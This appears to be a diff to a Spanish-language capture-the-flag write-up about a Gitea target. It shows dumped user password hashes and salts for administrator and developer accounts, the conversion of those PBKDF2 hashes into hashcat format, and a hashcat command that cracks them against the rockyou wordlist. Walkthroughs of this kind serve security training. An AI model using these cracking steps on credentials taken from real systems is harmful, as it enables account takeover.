@@ -38,7 +38,37 @@ SELECT name,passwd,passwd_hash_algo,salt,rands from user;
 | name              | passwd                                                                                                   | passwd_hash_algo    | salt                                 | rands                                |     |     |
 | ----------------- | -------------------------------------------------------------------------------------------------------- | ------------------- | ------------------------------------ | ------------------------------------ | --- | --- |
 | administrator<br> | cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136<br> | pbkdf2$50000$50<br> | 2d149e5fbd1b20cf31db3e3c6a28fc9b<br> | 70a5bd0c1a5d23caa49030172cdcabdc<br> |     |     |
-| administrator<br> | e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56<br> | pbkdf2$50000$50<br> | 8bf3e3452b78544f8bee9400d6936d34<br> | 0ce6f07fc9b557bc070fa7bef76a0d15<br> |     |     |
+| developer<br>     | e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56<br> | pbkdf2$50000$50<br> | 8bf3e3452b78544f8bee9400d6936d34<br> | 0ce6f07fc9b557bc070fa7bef76a0d15<br> |     |     |
+
+
+leyendo la pagina de https://www.unix-ninja.com/p/cracking_giteas_pbkdf2_password_hashes vemos el formato que necesita hashcat para crackear estos hashes, por lo que creamos un archivo llamado hashes.txt con la siguiente estructura
+
+pbkdf2-sha256:$iterations:$salt:$hash
+
+    pbkdf2-sha256 identifies the hashing algorithm.
+    $iterations is the number of PBKDF2 iterations.
+    $salt is the base64-encoded salt used for the password.
+    $hash is the resulting base64-encoded PBKDF2 hash.
+
+nos quedan los hashes de esta manera
+
+administrator-> `sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
+`
+
+developer->``
+`sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
+`
+Los crackeamos usando hashcat de la siguiente manera
+
+```
+hashcat -m 10900 -a 0 --status "sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=" /usr/share/wordlists/rockyou.txt
+```
+
+
+
+
+
+
 
 
 
